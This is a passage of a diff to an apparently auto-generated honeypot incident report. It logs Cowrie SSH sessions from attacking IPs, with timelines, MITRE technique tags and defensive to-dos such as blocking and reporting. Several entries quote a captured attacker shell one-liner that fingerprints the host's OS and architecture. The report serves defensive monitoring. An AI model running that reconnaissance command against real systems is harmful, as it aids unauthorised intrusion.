+| `2026-08-22 16:09:18` | `cowrie.command.success` |
+| `2026-08-22 16:09:18` | `cowrie.command.input` |
+| `2026-08-22 16:09:18` | `cowrie.command.input` |
+| `2026-08-22 16:09:18` | `cowrie.command.input` |
+| `2026-08-22 16:09:18` | `cowrie.command.input` |
+| `2026-08-22 16:09:18` | `cowrie.log.closed` |
+| `2026-08-22 16:09:19` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
 - [ ] Review commands for lateral movement indicators
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-0e2984d34b7c
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `93.118.164[.]193` |
-| **First Seen** | 2026-08-22 13:14 |
-| **Last Seen** | 2026-08-22 13:15 |
-| **Session Duration** | 13s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:14:49` | `cowrie.session.connect` |
-| `2026-08-22 13:14:49` | `cowrie.client.version` |
-| `2026-08-22 13:14:49` | `cowrie.client.kex` |
-| `2026-08-22 13:14:54` | `cowrie.login.success` |
-| `2026-08-22 13:14:56` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:15:02` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `93.118.164[.]193` to AbuseIPDB if not already reported
-- [ ] Block `93.118.164[.]193` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-87c4d3ddf28f
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `219.73.79[.]33` |
-| **First Seen** | 2026-08-22 13:15 |
-| **Last Seen** | 2026-08-22 13:15 |
-| **Session Duration** | 7s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:15:02` | `cowrie.session.connect` |
-| `2026-08-22 13:15:03` | `cowrie.client.version` |
-| `2026-08-22 13:15:03` | `cowrie.client.kex` |
-| `2026-08-22 13:15:04` | `cowrie.login.success` |
-| `2026-08-22 13:15:05` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:15:10` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `219.73.79[.]33` to AbuseIPDB if not already reported
-- [ ] Block `219.73.79[.]33` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-94e588a2f0dd
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:16 |
-| **Last Seen** | 2026-08-22 13:16 |
-| **Session Duration** | 2s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:16:13` | `cowrie.session.connect` |
-| `2026-08-22 13:16:13` | `cowrie.client.version` |
-| `2026-08-22 13:16:13` | `cowrie.client.kex` |
-| `2026-08-22 13:16:15` | `cowrie.login.success` |
-| `2026-08-22 13:16:16` | `cowrie.session.params` |
-| `2026-08-22 13:16:16` | `cowrie.command.input` |
-| `2026-08-22 13:16:16` | `cowrie.command.input` |
-| `2026-08-22 13:16:16` | `cowrie.command.input` |
-| `2026-08-22 13:16:16` | `cowrie.command.input` |
-| `2026-08-22 13:16:16` | `cowrie.command.input` |
-| `2026-08-22 13:16:16` | `cowrie.command.success` |
-| `2026-08-22 13:16:16` | `cowrie.command.input` |
-| `2026-08-22 13:16:16` | `cowrie.command.input` |
-| `2026-08-22 13:16:16` | `cowrie.command.input` |
-| `2026-08-22 13:16:16` | `cowrie.command.input` |
-| `2026-08-22 13:16:16` | `cowrie.log.closed` |
-| `2026-08-22 13:16:16` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-6abc23836e68
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:17 |
-| **Last Seen** | 2026-08-22 13:17 |
-| **Session Duration** | 2s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:17:49` | `cowrie.session.connect` |
-| `2026-08-22 13:17:50` | `cowrie.client.version` |
-| `2026-08-22 13:17:50` | `cowrie.client.kex` |
-| `2026-08-22 13:17:50` | `cowrie.login.success` |
-| `2026-08-22 13:17:51` | `cowrie.session.params` |
-| `2026-08-22 13:17:51` | `cowrie.command.input` |
-| `2026-08-22 13:17:51` | `cowrie.command.input` |
-| `2026-08-22 13:17:51` | `cowrie.command.input` |
-| `2026-08-22 13:17:51` | `cowrie.command.input` |
-| `2026-08-22 13:17:51` | `cowrie.command.input` |
-| `2026-08-22 13:17:51` | `cowrie.command.success` |
-| `2026-08-22 13:17:51` | `cowrie.command.input` |
-| `2026-08-22 13:17:51` | `cowrie.command.input` |
-| `2026-08-22 13:17:51` | `cowrie.command.input` |
-| `2026-08-22 13:17:51` | `cowrie.command.input` |
-| `2026-08-22 13:17:51` | `cowrie.log.closed` |
-| `2026-08-22 13:17:51` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-8c489b6c1623
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `61.12.84[.]172` |
-| **First Seen** | 2026-08-22 13:17 |
-| **Last Seen** | 2026-08-22 13:18 |
-| **Session Duration** | 7s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:17:56` | `cowrie.session.connect` |
-| `2026-08-22 13:17:57` | `cowrie.client.version` |
-| `2026-08-22 13:17:57` | `cowrie.client.kex` |
-| `2026-08-22 13:17:59` | `cowrie.login.success` |
-| `2026-08-22 13:17:59` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:18:04` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `61.12.84[.]172` to AbuseIPDB if not already reported
-- [ ] Block `61.12.84[.]172` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-833dd85cfd60
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `57.133.202[.]56` |
-| **First Seen** | 2026-08-22 13:18 |
-| **Last Seen** | 2026-08-22 13:18 |
-| **Session Duration** | 7s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:18:04` | `cowrie.session.connect` |
-| `2026-08-22 13:18:05` | `cowrie.client.version` |
-| `2026-08-22 13:18:05` | `cowrie.client.kex` |
-| `2026-08-22 13:18:06` | `cowrie.login.success` |
-| `2026-08-22 13:18:07` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:18:11` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `57.133.202[.]56` to AbuseIPDB if not already reported
-- [ ] Block `57.133.202[.]56` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-558e3ed5c705
+### 🔴 HIGH · IR-718840cf2938
 
 | Field | Detail |
 |---|---|
 | **Source IP** | `217.60.255[.]130` |
-| **First Seen** | 2026-08-22 13:18 |
-| **Last Seen** | 2026-08-22 13:18 |
+| **First Seen** | 2026-08-22 16:09 |
+| **Last Seen** | 2026-08-22 16:09 |
 | **Session Duration** | 1s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -1455,14 +3743,14 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 13:18:45` | `cowrie.session.connect` |
-| `2026-08-22 13:18:45` | `cowrie.client.version` |
-| `2026-08-22 13:18:45` | `cowrie.client.kex` |
-| `2026-08-22 13:18:46` | `cowrie.login.success` |
-| `2026-08-22 13:18:47` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:18:47` | `cowrie.direct-tcpip.ja4h` |
-| `2026-08-22 13:18:47` | `cowrie.direct-tcpip.data` |
-| `2026-08-22 13:18:47` | `cowrie.session.closed` |
+| `2026-08-22 16:09:48` | `cowrie.session.connect` |
+| `2026-08-22 16:09:48` | `cowrie.client.version` |
+| `2026-08-22 16:09:48` | `cowrie.client.kex` |
+| `2026-08-22 16:09:49` | `cowrie.login.success` |
+| `2026-08-22 16:09:49` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 16:09:49` | `cowrie.direct-tcpip.ja4h` |
+| `2026-08-22 16:09:49` | `cowrie.direct-tcpip.data` |
+| `2026-08-22 16:09:49` | `cowrie.session.closed` |
 
 **Recommended Actions:**
 - [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
@@ -1471,13 +3759,13 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 - [ ] Confirm tunnel target is not internal infrastructure
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-ac39752bba10
+### 🔴 HIGH · IR-53b90d897a12
 
 | Field | Detail |
 |---|---|
 | **Source IP** | `217.60.255[.]130` |
-| **First Seen** | 2026-08-22 13:18 |
-| **Last Seen** | 2026-08-22 13:18 |
+| **First Seen** | 2026-08-22 16:09 |
+| **Last Seen** | 2026-08-22 16:09 |
 | **Session Duration** | 1s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -1488,14 +3776,14 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 13:18:49` | `cowrie.session.connect` |
-| `2026-08-22 13:18:49` | `cowrie.client.version` |
-| `2026-08-22 13:18:50` | `cowrie.client.kex` |
-| `2026-08-22 13:18:50` | `cowrie.login.success` |
-| `2026-08-22 13:18:51` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:18:51` | `cowrie.direct-tcpip.ja4h` |
-| `2026-08-22 13:18:51` | `cowrie.direct-tcpip.data` |
-| `2026-08-22 13:18:51` | `cowrie.session.closed` |
+| `2026-08-22 16:09:52` | `cowrie.session.connect` |
+| `2026-08-22 16:09:52` | `cowrie.client.version` |
+| `2026-08-22 16:09:52` | `cowrie.client.kex` |
+| `2026-08-22 16:09:53` | `cowrie.login.success` |
+| `2026-08-22 16:09:53` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 16:09:53` | `cowrie.direct-tcpip.ja4h` |
+| `2026-08-22 16:09:53` | `cowrie.direct-tcpip.data` |
+| `2026-08-22 16:09:53` | `cowrie.session.closed` |
 
 **Recommended Actions:**
 - [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
@@ -1504,14 +3792,14 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 - [ ] Confirm tunnel target is not internal infrastructure
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-1ca29517b2eb
+### 🔴 HIGH · IR-35e5e346017d
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:19 |
-| **Last Seen** | 2026-08-22 13:19 |
-| **Session Duration** | 1s |
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 16:10 |
+| **Last Seen** | 2026-08-22 16:10 |
+| **Session Duration** | 3s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
 | **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
@@ -1521,38 +3809,38 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 13:19:32` | `cowrie.session.connect` |
-| `2026-08-22 13:19:32` | `cowrie.client.version` |
-| `2026-08-22 13:19:33` | `cowrie.client.kex` |
-| `2026-08-22 13:19:33` | `cowrie.login.success` |
-| `2026-08-22 13:19:34` | `cowrie.session.params` |
-| `2026-08-22 13:19:34` | `cowrie.command.input` |
-| `2026-08-22 13:19:34` | `cowrie.command.input` |
-| `2026-08-22 13:19:34` | `cowrie.command.input` |
-| `2026-08-22 13:19:34` | `cowrie.command.input` |
-| `2026-08-22 13:19:34` | `cowrie.command.input` |
-| `2026-08-22 13:19:34` | `cowrie.command.success` |
-| `2026-08-22 13:19:34` | `cowrie.command.input` |
-| `2026-08-22 13:19:34` | `cowrie.command.input` |
-| `2026-08-22 13:19:34` | `cowrie.command.input` |
-| `2026-08-22 13:19:34` | `cowrie.command.input` |
-| `2026-08-22 13:19:34` | `cowrie.log.closed` |
-| `2026-08-22 13:19:34` | `cowrie.session.closed` |
+| `2026-08-22 16:10:34` | `cowrie.session.connect` |
+| `2026-08-22 16:10:34` | `cowrie.client.version` |
+| `2026-08-22 16:10:34` | `cowrie.client.kex` |
+| `2026-08-22 16:10:35` | `cowrie.login.success` |
+| `2026-08-22 16:10:37` | `cowrie.session.params` |
+| `2026-08-22 16:10:37` | `cowrie.command.input` |
+| `2026-08-22 16:10:37` | `cowrie.command.input` |
+| `2026-08-22 16:10:37` | `cowrie.command.input` |
+| `2026-08-22 16:10:37` | `cowrie.command.input` |
+| `2026-08-22 16:10:37` | `cowrie.command.input` |
+| `2026-08-22 16:10:37` | `cowrie.command.success` |
+| `2026-08-22 16:10:37` | `cowrie.command.input` |
+| `2026-08-22 16:10:37` | `cowrie.command.input` |
+| `2026-08-22 16:10:37` | `cowrie.command.input` |
+| `2026-08-22 16:10:37` | `cowrie.command.input` |
+| `2026-08-22 16:10:37` | `cowrie.log.closed` |
+| `2026-08-22 16:10:38` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
 - [ ] Review commands for lateral movement indicators
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-3c7ee36e1972
+### 🔴 HIGH · IR-15382d92661c
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:21 |
-| **Last Seen** | 2026-08-22 13:21 |
-| **Session Duration** | 1s |
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 16:12 |
+| **Last Seen** | 2026-08-22 16:12 |
+| **Session Duration** | 3s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
 | **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
@@ -1562,38 +3850,223 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 13:21:24` | `cowrie.session.connect` |
-| `2026-08-22 13:21:24` | `cowrie.client.version` |
-| `2026-08-22 13:21:24` | `cowrie.client.kex` |
-| `2026-08-22 13:21:25` | `cowrie.login.success` |
-| `2026-08-22 13:21:25` | `cowrie.session.params` |
-| `2026-08-22 13:21:25` | `cowrie.command.input` |
-| `2026-08-22 13:21:25` | `cowrie.command.input` |
-| `2026-08-22 13:21:25` | `cowrie.command.input` |
-| `2026-08-22 13:21:25` | `cowrie.command.input` |
-| `2026-08-22 13:21:25` | `cowrie.command.input` |
-| `2026-08-22 13:21:26` | `cowrie.command.success` |
-| `2026-08-22 13:21:26` | `cowrie.command.input` |
-| `2026-08-22 13:21:26` | `cowrie.command.input` |
-| `2026-08-22 13:21:26` | `cowrie.command.input` |
-| `2026-08-22 13:21:26` | `cowrie.command.input` |
-| `2026-08-22 13:21:26` | `cowrie.log.closed` |
-| `2026-08-22 13:21:26` | `cowrie.session.closed` |
+| `2026-08-22 16:12:01` | `cowrie.session.connect` |
+| `2026-08-22 16:12:02` | `cowrie.client.version` |
+| `2026-08-22 16:12:02` | `cowrie.client.kex` |
+| `2026-08-22 16:12:03` | `cowrie.login.success` |
+| `2026-08-22 16:12:04` | `cowrie.session.params` |
+| `2026-08-22 16:12:04` | `cowrie.command.input` |
+| `2026-08-22 16:12:04` | `cowrie.command.input` |
+| `2026-08-22 16:12:04` | `cowrie.command.input` |
+| `2026-08-22 16:12:04` | `cowrie.command.input` |
+| `2026-08-22 16:12:04` | `cowrie.command.input` |
+| `2026-08-22 16:12:04` | `cowrie.command.success` |
+| `2026-08-22 16:12:04` | `cowrie.command.input` |
+| `2026-08-22 16:12:04` | `cowrie.command.input` |
+| `2026-08-22 16:12:04` | `cowrie.command.input` |
+| `2026-08-22 16:12:04` | `cowrie.command.input` |
+| `2026-08-22 16:12:04` | `cowrie.log.closed` |
+| `2026-08-22 16:12:05` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
 - [ ] Review commands for lateral movement indicators
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-f5331fb2fe17
+### 🔴 HIGH · IR-3812816b2015
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 16:13 |
+| **Last Seen** | 2026-08-22 16:13 |
+| **Session Duration** | 2s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 16:13:28` | `cowrie.session.connect` |
+| `2026-08-22 16:13:28` | `cowrie.client.version` |
+| `2026-08-22 16:13:28` | `cowrie.client.kex` |
+| `2026-08-22 16:13:29` | `cowrie.login.success` |
+| `2026-08-22 16:13:30` | `cowrie.session.params` |
+| `2026-08-22 16:13:30` | `cowrie.command.input` |
+| `2026-08-22 16:13:30` | `cowrie.command.input` |
+| `2026-08-22 16:13:30` | `cowrie.command.input` |
+| `2026-08-22 16:13:30` | `cowrie.command.input` |
+| `2026-08-22 16:13:30` | `cowrie.command.input` |
+| `2026-08-22 16:13:30` | `cowrie.command.success` |
+| `2026-08-22 16:13:30` | `cowrie.command.input` |
+| `2026-08-22 16:13:30` | `cowrie.command.input` |
+| `2026-08-22 16:13:30` | `cowrie.command.input` |
+| `2026-08-22 16:13:30` | `cowrie.command.input` |
+| `2026-08-22 16:13:30` | `cowrie.log.closed` |
+| `2026-08-22 16:13:31` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-b03d8c0ca3de
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 16:14 |
+| **Last Seen** | 2026-08-22 16:14 |
+| **Session Duration** | 2s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 16:14:50` | `cowrie.session.connect` |
+| `2026-08-22 16:14:50` | `cowrie.client.version` |
+| `2026-08-22 16:14:50` | `cowrie.client.kex` |
+| `2026-08-22 16:14:51` | `cowrie.login.success` |
+| `2026-08-22 16:14:52` | `cowrie.session.params` |
+| `2026-08-22 16:14:52` | `cowrie.command.input` |
+| `2026-08-22 16:14:52` | `cowrie.command.input` |
+| `2026-08-22 16:14:52` | `cowrie.command.input` |
+| `2026-08-22 16:14:52` | `cowrie.command.input` |
+| `2026-08-22 16:14:52` | `cowrie.command.input` |
+| `2026-08-22 16:14:52` | `cowrie.command.success` |
+| `2026-08-22 16:14:52` | `cowrie.command.input` |
+| `2026-08-22 16:14:52` | `cowrie.command.input` |
+| `2026-08-22 16:14:52` | `cowrie.command.input` |
+| `2026-08-22 16:14:52` | `cowrie.command.input` |
+| `2026-08-22 16:14:53` | `cowrie.log.closed` |
+| `2026-08-22 16:14:53` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-96a408d393cc
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `120.243.121[.]6` |
+| **First Seen** | 2026-08-22 16:15 |
+| **Last Seen** | 2026-08-22 16:15 |
+| **Session Duration** | 8s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 16:15:27` | `cowrie.session.connect` |
+| `2026-08-22 16:15:27` | `cowrie.client.version` |
+| `2026-08-22 16:15:27` | `cowrie.client.kex` |
+| `2026-08-22 16:15:29` | `cowrie.login.success` |
+| `2026-08-22 16:15:30` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 16:15:35` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `120.243.121[.]6` to AbuseIPDB if not already reported
+- [ ] Block `120.243.121[.]6` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-555d5dc288f4
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `201.28.234[.]10` |
+| **First Seen** | 2026-08-22 16:15 |
+| **Last Seen** | 2026-08-22 16:15 |
+| **Session Duration** | 7s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 16:15:35` | `cowrie.session.connect` |
+| `2026-08-22 16:15:36` | `cowrie.client.version` |
+| `2026-08-22 16:15:36` | `cowrie.client.kex` |
+| `2026-08-22 16:15:38` | `cowrie.login.success` |
